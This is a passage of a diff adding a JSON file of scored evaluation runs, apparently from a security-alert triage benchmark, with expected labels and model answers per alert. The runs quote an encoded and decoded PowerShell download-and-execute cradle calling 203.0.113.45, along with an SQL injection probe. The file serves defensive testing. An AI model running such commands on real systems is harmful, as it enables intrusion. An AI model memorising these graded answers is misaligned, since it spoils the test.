@@ -1,0 +1,2995 @@
+{
+  "date": "2026-11-17",
+  "provider": "claude",
+  "model": "claude-sonnet-5-5",
+  "prompt_versions": [
+    "triage-v1"
+  ],
+  "runs_requested": 3,
+  "alerts": [
+    {
+      "id": "alert-001",
+      "expected": {
+        "severity": "Critical",
+        "classification": "true_positive",
+        "action_type": "isolate_host",
+        "needs_human_review": true,
+        "must_cite_fields": [
+          "command_line",
+          "process"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Critical",
+            "classification": "true_positive",
+            "confidence": "high",
+            "summary": "Encoded PowerShell on srv-sql-01 running as SYSTEM decodes to a download cradle: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/stage.ps1'). It fetches and runs a remote script from a bare IP over plain HTTP at 02:14 UTC, which is typical staged malware delivery. The SYSTEM context is the only possibly benign signal, and it does not explain the remote payload.",
+            "evidence": [
+              {
+                "field": "command_line",
+                "value": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADUALwBzAHQAYQBnAGUALgBwAHMAMQAnACkA",
+                "why": "The Base64 (UTF-16LE) decodes to IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/stage.ps1'). This is a download-and-execute cradle pulling a 'stage' script from a bare IP, which points to malicious activity. The encoding hides the intent."
+              },
+              {
+                "field": "user",
+                "value": "SYSTEM",
+                "why": "SYSTEM can be benign, since management or automation tooling sometimes runs scripts this way. Here it means any payload runs with the highest local privileges, which raises the impact. It does not justify an encoded remote download."
+              },
+              {
+                "field": "host",
+                "value": "srv-sql-01",
+                "why": "A production database server should rarely run encoded PowerShell that fetches remote code. A compromise here puts sensitive data at risk and could allow lateral movement."
+              },
+              {
+                "field": "process",
+                "value": "powershell.exe",
+                "why": "PowerShell is a legitimate admin tool, but combined with -enc and a web download it is a common living-off-the-land technique."
+              }
+            ],
+            "recommended_action": {
+              "type": "isolate_host",
+              "detail": "After analyst confirmation, isolate srv-sql-01 via EDR. Block 203.0.113.45 at the proxy and firewall. Pull the process tree, parent process and network connections to find what launched PowerShell, and check whether stage.ps1 was downloaded or run. Hunt for the same IP and command pattern on other hosts, review SQL service and SYSTEM-level persistence, and escalate to incident response."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Severity is Critical",
+              "Recommended action isolates a host"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 2,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Critical",
+            "classification": "true_positive",
+            "confidence": "high",
+            "summary": "The base64 payload decodes to an IEX download cradle: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/stage.ps1'). This runs a remote script in memory, and it ran as SYSTEM on a database server at 02:14 UTC, which strongly suggests staged malware or hands-on-keyboard compromise. Treat the host as compromised until proven otherwise.",
+            "evidence": [
+              {
+                "field": "command_line",
+                "value": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADUALwBzAHQAYQBnAGUALgBwAHMAMQAnACkA",
+                "why": "Decodes to IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/stage.ps1'). This is a classic fileless download-and-execute cradle fetching a 'stage' script from an external IP over plain HTTP. Encoding the command also hides its intent."
+              },
+              {
+                "field": "user",
+                "value": "SYSTEM",
+                "why": "SYSTEM context means the attacker already has high privileges or abused a service or scheduled task. Management tooling can legitimately run as SYSTEM, which is the only benign-leaning signal, but it does not explain a remote script download."
+              },
+              {
+                "field": "host",
+                "value": "srv-sql-01",
+                "why": "Database servers rarely run encoded PowerShell that downloads remote content. The host likely holds sensitive data, so the potential impact is high."
+              },
+              {
+                "field": "process",
+                "value": "powershell.exe",
+                "why": "PowerShell is a legitimate admin tool, which weakly supports a benign explanation. In this case it is the execution vehicle for the remote payload, so the benign explanation is unlikely."
+              }
+            ],
+            "recommended_action": {
+              "type": "isolate_host",
+              "detail": "Isolate srv-sql-01 from the network via EDR after analyst confirmation. Block 203.0.113.45 at the proxy and firewall. Then check the process tree and parent process, look for scheduled tasks, services, or persistence, and search for other hosts that contacted 203.0.113.45. Capture memory and triage data before remediation, and review SQL service accounts and credentials for exposure."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Severity is Critical",
+              "Recommended action isolates a host"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 3,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Critical",
+            "classification": "true_positive",
+            "confidence": "high",
+            "summary": "SYSTEM ran PowerShell with a base64-encoded command on the database server srv-sql-01 at 02:14 UTC. The decoded command is 'IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/stage.ps1')', a download cradle that fetches and runs a remote script in memory. This is a classic staged-payload pattern, and the only benign explanation (SYSTEM-level admin automation) does not fit the content.",
+            "evidence": [
+              {
+                "field": "command_line",
+                "value": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADUALwBzAHQAYQBnAGUALgBwAHMAMQAnACkA",
+                "why": "The base64 (UTF-16LE) decodes to IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/stage.ps1'). That is a fileless download-and-execute cradle fetching 'stage.ps1' from an external IP, which is strongly malicious."
+              },
+              {
+                "field": "user",
+                "value": "SYSTEM",
+                "why": "Running as SYSTEM could be legitimate management or scheduled automation (the benign side), but legitimate tooling rarely uses encoded IEX download cradles. It more likely means the host is already compromised with high privileges, or a service or task was abused."
+              },
+              {
+                "field": "host",
+                "value": "srv-sql-01",
+                "why": "A database server normally has no reason to pull scripts from the internet, and it likely holds sensitive data, so the impact is high."
+              },
+              {
+                "field": "process",
+                "value": "powershell.exe",
+                "why": "PowerShell with -enc is a common living-off-the-land technique to evade command-line inspection and is consistent with the decoded payload."
+              }
+            ],
+            "recommended_action": {
+              "type": "isolate_host",
+              "detail": "Isolate srv-sql-01 via EDR after analyst confirmation. Block 203.0.113.45 at the proxy and firewall, and search for other hosts that contacted it. Pull the parent process and persistence mechanisms (services, scheduled tasks), retrieve stage.ps1 if possible, review SQL service accounts and credentials for compromise, and escalate to incident response."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Severity is Critical",
+              "Recommended action isolates a host"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        }
+      ]
+    },
+    {
+      "id": "alert-002",
+      "expected": {
+        "severity": "High",
+        "classification": "true_positive",
+        "action_type": "block_ip",
+        "needs_human_review": true,
+        "must_cite_fields": [
+          "uri",
+          "status_code"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "High",
+            "classification": "true_positive",
+            "confidence": "medium",
+            "summary": "A GET request to the users API carried a classic SQL injection payload and was sent by sqlmap, an automated exploitation tool. The server returned HTTP 200, so the injection may have worked, but the alert has no response body or size to confirm data exposure. Treat it as a real attack attempt with possible success and escalate for review of the application and database logs.",
+            "evidence": [
+              {
+                "field": "uri",
+                "value": "/api/v1/users?id=1' OR '1'='1",
+                "why": "The tautology payload in the id parameter is a textbook SQL injection probe against a user data endpoint."
+              },
+              {
+                "field": "user_agent",
+                "value": "sqlmap/1.7",
+                "why": "This is the default user agent of the sqlmap exploitation tool. It points to automated, deliberate attack tooling, unless an authorized pen test explains it."
+              },
+              {
+                "field": "status_code",
+                "value": "200",
+                "why": "The request was not blocked or rejected, so the payload may have reached the backend query. This is the main reason for the High severity."
+              },
+              {
+                "field": "method",
+                "value": "GET",
+                "why": "A GET request is read-oriented, and a 200 does not prove the injection worked, because the API could have sanitized the input and returned a normal or empty result. This is the benign-leaning uncertainty that keeps confidence at medium."
+              },
+              {
+                "field": "source_ip",
+                "value": "198.51.100.23",
+                "why": "The external source needs checking against authorized scanner or pen-test lists and for other requests, since a single probe is usually part of a larger scan."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Escalate to L2 and the application owner. Review the response size and body for this request and the database query logs around 2026-11-03T09:41:52Z to see whether data was returned. Check for other requests from 198.51.100.23 and confirm it is not an authorized pen test. If it is not authorized, propose blocking the IP at the WAF and fixing the injectable parameter with parameterized queries."
+            },
+            "needs_human_review": false,
+            "review_reasons": [],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": false,
+              "needs_human_review": false,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 2,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "High",
+            "classification": "true_positive",
+            "confidence": "high",
+            "summary": "A GET request to /api/v1/users carried a classic SQL injection tautology (' OR '1'='1) and came from a client identifying as sqlmap, an automated SQLi tool. The request returned HTTP 200, so the injection may have succeeded and exposed user data. Treat as probable active exploitation until the backend is checked.",
+            "evidence": [
+              {
+                "field": "uri",
+                "value": "/api/v1/users?id=1' OR '1'='1",
+                "why": "The id parameter contains a textbook SQL injection tautology, which indicates a deliberate attempt to manipulate the query and return all user rows."
+              },
+              {
+                "field": "user_agent",
+                "value": "sqlmap/1.7",
+                "why": "This is the default user agent of the sqlmap automated SQL injection tool, confirming scanning or exploitation tooling rather than a normal client."
+              },
+              {
+                "field": "status_code",
+                "value": "200",
+                "why": "A 200 response means the server processed the request without error. This could mean the injection worked and data was returned, though a generic 200 page that ignores the payload is also possible, so response size and body need checking."
+              },
+              {
+                "field": "method",
+                "value": "GET",
+                "why": "A plain GET with the payload in the query string is consistent with normal API use, so the method alone is not suspicious. Only the parameter content and tool signature make this malicious."
+              },
+              {
+                "field": "source_ip",
+                "value": "198.51.100.23",
+                "why": "An external source running sqlmap against a user API suggests a probing attacker. Check for other requests from this IP to judge scope."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Escalate to the application and incident response teams. Review web and database logs for this request and other requests from 198.51.100.23 to check whether user data was returned (response size, rows read, anomalous queries). If so, block the IP at the WAF/edge, treat it as a potential data exposure, and fix the id parameter handling with input validation and parameterized queries."
+            },
+            "needs_human_review": false,
+            "review_reasons": [],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": false,
+              "needs_human_review": false,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 3,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "High",
+            "classification": "true_positive",
+            "confidence": "high",
+            "summary": "A GET request to the user API contained a classic SQL injection tautology (' OR '1'='1) and came from a sqlmap user agent, an automated SQL injection tool. The server returned HTTP 200, so the injection may have succeeded and exposed user data. This needs prompt escalation to confirm whether data was leaked.",
+            "evidence": [
+              {
+                "field": "uri",
+                "value": "/api/v1/users?id=1' OR '1'='1",
+                "why": "The id parameter contains a standard SQL injection tautology, which is a clear malicious pattern aimed at bypassing query filtering."
+              },
+              {
+                "field": "user_agent",
+                "value": "sqlmap/1.7",
+                "why": "This is the default user agent of the sqlmap exploitation tool, which indicates automated attack tooling rather than a normal client."
+              },
+              {
+                "field": "status_code",
+                "value": "200",
+                "why": "A successful response means the WAF did not block the request and the backend may have processed the injected query. The response body size and content must be checked for data exposure. A 200 can also be a generic page with no leaked data, which is the only benign possibility."
+              },
+              {
+                "field": "source_ip",
+                "value": "198.51.100.23",
+                "why": "This single external IP is the origin of the scanning activity. Check for other requests from it and for any authorized pentest or scanner scheduled for this address."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Escalate to the incident response and application teams. Review the app and database logs for the request and the response size to determine whether user data was returned, and search WAF logs for other requests from 198.51.100.23. Block the IP at the WAF or edge once the analyst confirms it is not an authorized security test. Ask the app team to fix the injectable parameter with parameterized queries and tighten the WAF rule to block this pattern."
+            },
+            "needs_human_review": false,
+            "review_reasons": [],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": false,
+              "needs_human_review": false,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        }
+      ]
+    },
+    {
+      "id": "alert-003",
+      "expected": {
+        "severity": "High",
+        "classification": "true_positive",
+        "action_type": "reset_credentials",
+        "needs_human_review": true,
+        "must_cite_fields": [
+          "failed_attempts",
+          "source_ip"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "High",
+            "classification": "true_positive",
+            "confidence": "medium",
+            "summary": "The privileged account it-admin logged in successfully right after 48 failed attempts in 10 minutes from 203.0.113.88, a pattern consistent with a successful password-guessing or brute-force attack. The alert has no context on whether the IP is a known admin location or whether MFA was used, so the verdict is not certain, but the risk of admin compromise is high.",
+            "evidence": [
+              {
+                "field": "failed_attempts",
+                "value": "48",
+                "why": "48 failures in a short window is far above normal typo behavior and indicates automated guessing or credential stuffing (malicious signal)."
+              },
+              {
+                "field": "window_minutes",
+                "value": "10",
+                "why": "The failures were compressed into 10 minutes, which supports automated activity rather than a user who forgot a password."
+              },
+              {
+                "field": "result",
+                "value": "success",
+                "why": "The burst ended in a successful login, so the attacker may have obtained valid admin credentials (malicious signal)."
+              },
+              {
+                "field": "account",
+                "value": "it-admin",
+                "why": "This is a privileged account, so a compromise would have high impact. It is also the kind of account that could be locked out or misconfigured by a legitimate admin or script (possible benign explanation)."
+              },
+              {
+                "field": "source_ip",
+                "value": "203.0.113.88",
+                "why": "The IP is not shown to be tied to a known corporate or admin location. The payload has no reputation or allowlist data, so a benign source such as a misconfigured service or a VPN egress point cannot be ruled out."
+              }
+            ],
+            "recommended_action": {
+              "type": "reset_credentials",
+              "detail": "Reset the it-admin password and revoke active sessions and tokens now. Then review post-login activity from 203.0.113.88 (privilege changes, new accounts, config changes), check whether MFA was enforced, and block the IP if it is not a known admin source. Confirm with the account owner whether they or an automated job caused the failed attempts."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Recommended action resets credentials"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 2,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "High",
+            "classification": "needs_investigation",
+            "confidence": "medium",
+            "summary": "The privileged account it-admin logged in successfully after 48 failed attempts in 10 minutes from 203.0.113.88, which looks like a possible brute-force or password-spray success. The payload gives no context on whether the IP is known, whether MFA was used, or whether the user simply locked themselves out, so a compromise cannot be confirmed or ruled out yet.",
+            "evidence": [
+              {
+                "field": "failed_attempts",
+                "value": "48",
+                "why": "48 failures in a short window is far beyond normal mistyped passwords and matches automated guessing, which points to malicious activity."
+              },
+              {
+                "field": "result",
+                "value": "success",
+                "why": "A success following the burst means the attacker (if any) may have obtained valid admin credentials, raising impact."
+              },
+              {
+                "field": "account",
+                "value": "it-admin",
+                "why": "This is a privileged account, so a compromise would allow broad access and lateral movement."
+              },
+              {
+                "field": "window_minutes",
+                "value": "10",
+                "why": "The compressed timeframe suggests automation, though a script or misconfigured service/saved credential could also cause this benign pattern."
+              },
+              {
+                "field": "source_ip",
+                "value": "203.0.113.88",
+                "why": "A single source IP for both failures and the success could be a legitimate admin or a misconfigured tool, which is a benign possibility. Its ownership and reputation are not established in the alert, so it cannot be treated as benign or malicious without checking."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Escalate to L2/IR now. Check the source IP against known admin/VPN ranges and threat intel, review the it-admin session activity after 03:27:30Z, and confirm MFA status. Contact the account owner out-of-band to verify the login. If not verified, reset it-admin credentials, revoke active sessions, and block 203.0.113.88."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": false,
+              "action": false,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 3,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "High",
+            "classification": "needs_investigation",
+            "confidence": "medium",
+            "summary": "The privileged account it-admin logged in successfully right after 48 failed attempts in 10 minutes from 203.0.113.88, a pattern consistent with a successful brute-force or password-spray attack. The payload has no evidence that the IP is a known corporate or admin source, and an admin who forgot a password could cause a similar pattern, so the cause is unconfirmed. Treat as a possible account compromise until the source and session activity are verified.",
+            "evidence": [
+              {
+                "field": "failed_attempts",
+                "value": "48",
+                "why": "A high count of failures in a short window is typical of automated brute-force or credential stuffing, not normal user typos."
+              },
+              {
+                "field": "window_minutes",
+                "value": "10",
+                "why": "48 failures in 10 minutes means about 5 attempts per minute, suggesting automation rather than a person retyping a password."
+              },
+              {
+                "field": "result",
+                "value": "success",
+                "why": "A success after the burst suggests the attacker may have obtained valid credentials. It could also be a legitimate admin who eventually entered the correct password, which keeps this from being a confirmed compromise."
+              },
+              {
+                "field": "account",
+                "value": "it-admin",
+                "why": "This is a privileged account, so compromise would have high impact, and the stakes justify prompt review."
+              },
+              {
+                "field": "source_ip",
+                "value": "203.0.113.88",
+                "why": "The payload gives no indication whether this IP belongs to a corporate VPN, office, or known admin location. Its origin must be checked, and an expected source would support a benign explanation such as a lockout or misconfigured service."
+              }
+            ],
+            "recommended_action": {
+              "type": "escalate",
+              "detail": "Escalate to L2/IR now. Check whether 203.0.113.88 is a known corporate or VPN address, and contact the it-admin owner to confirm whether they performed the login. Review post-login activity for this session (privilege changes, new accounts, config changes). If the login is not confirmed as legitimate, reset it-admin credentials, revoke active sessions, and block the source IP."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Classification is needs_investigation"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": false,
+              "action": false,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        }
+      ]
+    },
+    {
+      "id": "alert-004",
+      "expected": {
+        "severity": "High",
+        "classification": "true_positive",
+        "action_type": "reset_credentials",
+        "needs_human_review": true,
+        "must_cite_fields": [
+          "url",
+          "user_clicked"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "High",
+            "classification": "true_positive",
+            "confidence": "high",
+            "summary": "An employee clicked a link in an email that has the hallmarks of credential phishing: an urgent mailbox-suspension lure, a lookalike login URL, and a failed SPF check. Because the click is confirmed, the user's credentials may be exposed if they entered them on the page.",
+            "evidence": [
+              {
+                "field": "user_clicked",
+                "value": "true",
+                "why": "The user interacted with the link, so exposure is real and not just a delivered email. This is the main reason to act now."
+              },
+              {
+                "field": "spf_result",
+                "value": "fail",
+                "why": "The sending server is not authorized for the claimed domain, which indicates a spoofed or illegitimate sender."
+              },
+              {
+                "field": "subject",
+                "value": "Your mailbox will be suspended today",
+                "why": "Urgency and a threat of account suspension are a classic credential-phishing lure."
+              },
+              {
+                "field": "url",
+                "value": "https://account-verify.example.com/login",
+                "why": "A generic 'account-verify' domain hosting a login page is typical of a credential-harvesting site rather than a legitimate vendor portal."
+              },
+              {
+                "field": "sender",
+                "value": "support@account-verify.example.com",
+                "why": "The sender uses the same lookalike domain as the link, so the email and landing page are consistent with a single phishing campaign. No raw_payload field points to benign activity; the only unknown is whether the user submitted credentials."
+              }
+            ],
+            "recommended_action": {
+              "type": "reset_credentials",
+              "detail": "Reset the user's password and revoke active sessions and tokens now. Check sign-in logs for suspicious logins after 2026-11-04T10:05:18Z, and ask the user whether they entered credentials on the page. Block the domain account-verify.example.com at the proxy and email gateway, and search for and purge the same email from other mailboxes."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Recommended action resets credentials"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 2,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "High",
+            "classification": "true_positive",
+            "confidence": "high",
+            "summary": "An employee clicked a link in an email that looks like credential phishing: urgent mailbox-suspension wording, a lookalike login domain, and a failed SPF check. Because the user clicked, credentials may have been entered, so this needs prompt containment and follow-up.",
+            "evidence": [
+              {
+                "field": "user_clicked",
+                "value": "true",
+                "why": "The user interacted with the link, so exposure has occurred and credential entry is possible. This raises the severity above a blocked or unopened phish."
+              },
+              {
+                "field": "spf_result",
+                "value": "fail",
+                "why": "The sending server is not authorized for the claimed domain. This indicates likely spoofing or an illegitimate sender and points to malicious activity."
+              },
+              {
+                "field": "subject",
+                "value": "Your mailbox will be suspended today",
+                "why": "Urgency and threat-of-suspension wording is a classic credential-phishing social-engineering pattern."
+              },
+              {
+                "field": "url",
+                "value": "https://account-verify.example.com/login",
+                "why": "A generic 'account-verify' domain hosting a /login page matches a credential-harvesting landing page. The HTTPS scheme does not make it legitimate. No evidence in the payload shows this is a sanctioned vendor or internal service, which is the only benign explanation, and it is unsupported."
+              },
+              {
+                "field": "sender",
+                "value": "support@account-verify.example.com",
+                "why": "The sender uses the same lookalike domain as the login URL, so the sender and landing page are consistent. Combined with the SPF failure, this suggests a deliberate impersonation campaign rather than a misconfigured legitimate sender."
+              }
+            ],
+            "recommended_action": {
+              "type": "reset_credentials",
+              "detail": "Force a password reset and revoke active sessions and tokens for the user who clicked. Review sign-in logs for suspicious logins after 2026-11-04T10:05:18Z, and check MFA changes and mailbox forwarding rules. Block account-verify.example.com at the web proxy and DNS, and search for and purge the same email from other mailboxes. Confirm with the user whether they entered credentials."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Recommended action resets credentials"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 3,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "High",
+            "classification": "true_positive",
+            "confidence": "high",
+            "summary": "An employee clicked a link in a credential-phishing email sent from a lookalike domain that failed SPF validation. The subject uses an urgency lure typical of phishing. The user may have entered credentials on the fake login page, so the account should be treated as potentially compromised.",
+            "evidence": [
+              {
+                "field": "spf_result",
+                "value": "fail",
+                "why": "SPF failure means the sending server is not authorized for the domain, which points to spoofing or malicious sending infrastructure."
+              },
+              {
+                "field": "subject",
+                "value": "Your mailbox will be suspended today",
+                "why": "Urgency and account-suspension threats are a classic credential-phishing lure."
+              },
+              {
+                "field": "url",
+                "value": "https://account-verify.example.com/login",
+                "why": "A login page on a generic 'account-verify' lookalike domain is consistent with a credential-harvesting page; HTTPS alone does not make it legitimate."
+              },
+              {
+                "field": "user_clicked",
+                "value": "true",
+                "why": "The user interacted with the link, so credential exposure is possible and this is not just a blocked or undelivered email."
+              },
+              {
+                "field": "sender",
+                "value": "support@account-verify.example.com",
+                "why": "Generic 'support@' sender on a verification-themed domain is the only mildly benign-looking signal (it resembles a legitimate service notice), but it is outweighed by the SPF failure and lure content."
+              }
+            ],
+            "recommended_action": {
+              "type": "reset_credentials",
+              "detail": "Reset the clicked user's password and revoke active sessions/tokens, and check for MFA changes or suspicious sign-ins since 10:05Z. Confirm with the user whether credentials were entered. Block account-verify.example.com at the proxy/DNS and email gateway, and search for and purge the same message from other mailboxes."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Recommended action resets credentials"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        }
+      ]
+    },
+    {
+      "id": "alert-005",
+      "expected": {
+        "severity": "Critical",
+        "classification": "true_positive",
+        "action_type": "isolate_host",
+        "needs_human_review": true,
+        "must_cite_fields": [
+          "detection",
+          "action_taken"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Critical",
+            "classification": "true_positive",
+            "confidence": "medium",
+            "summary": "Antivirus flagged invoice_2026.exe on finance workstation ws-finance-07 as ransomware (Ransom.Generic.Encrypt) and failed to quarantine it, so the file may still be present or running. The generic detection name leaves some chance of a false positive, but the file's location and name fit a ransomware dropper and the failed containment makes this urgent.",
+            "evidence": [
+              {
+                "field": "detection",
+                "value": "Ransom.Generic.Encrypt",
+                "why": "Ransomware-family signature points to malicious activity. The generic name could come from a heuristic match, so a false positive is possible but less likely given the other indicators."
+              },
+              {
+                "field": "path",
+                "value": "C:\\Users\\Public\\invoice_2026.exe",
+                "why": "An executable with an invoice-themed name in the world-writable Public folder is a common phishing or dropper pattern, and a legitimate invoice would not normally be an .exe."
+              },
+              {
+                "field": "action_taken",
+                "value": "quarantine_failed",
+                "why": "The threat was not contained, so the file may still execute or may already have run and begun encrypting files."
+              },
+              {
+                "field": "host",
+                "value": "ws-finance-07",
+                "why": "A finance workstation likely has access to sensitive data and network shares, which raises the impact if encryption spreads."
+              }
+            ],
+            "recommended_action": {
+              "type": "isolate_host",
+              "detail": "Isolate ws-finance-07 from the network now, and have the analyst confirm whether invoice_2026.exe is running or has modified files. Then remove the file manually or collect it for analysis, check for encrypted files or ransom notes, review mapped shares for spread, and trace how the file arrived (email or download). Escalate to incident response."
+            },
+            "needs_human_review": true,
+            "review_reasons": [
+              "Severity is Critical",
+              "Recommended action isolates a host"
+            ],
+            "meta": {
+              "provider": "claude",
+              "model": "claude-sonnet-5-5",
+              "prompt_version": "triage-v1",
+              "source": "live"
+            }
+          },
+          "score": {
+            "passes": {
+              "severity_exact": true,
+              "severity_within_1": true,
+              "classification": true,
+              "action": true,
+              "needs_human_review": true,
+              "required_fields": true
+            },
+            "missing_fields": []
+          }
+        },
+        {
+          "run": 2,
+          "ok": true,
+          "attempts": 1,
+          "result": {
+            "severity": "Critical",
+            "classification": "true_positive",
+            "confidence": "medium",
+            "summary": "Antivirus flagged a ransomware signature on finance workstation ws-finance-07, and the quarantine failed, so the file may still be present and able to run. The detection is generic and the alert has no execution or encryption telemetry, but the risk is high enough to treat it as real until proven otherwise.",
+            "evidence": [
+              {
+                "field": "detection",
+                "value": "Ransom.Generic.Encrypt",
+                "why": "Malicious signal: a ransomware-family detection. It is a generic heuristic name, though, so a false positive is possible and nothing here confirms encryption has started."
+              },
+              {
+                "field": "action_taken",
+                "value": "quarantine_failed",
+                "why": "Malicious signal: the malware was not contained and the file may still be on disk or running. This is the main reason for urgency."
+              },
+              {
+                "field": "path",
+                "value": "C:\\Users\\Public\\invoice_2026.exe",
+                "why": "Malicious signal: an executable in a world-writable public folder with an invoice-themed name is a typical phishing or dropper pattern. The file sits in a user-writable location and is not an installed application, which is the only mildly benign-leaning context."
+              },
+              {
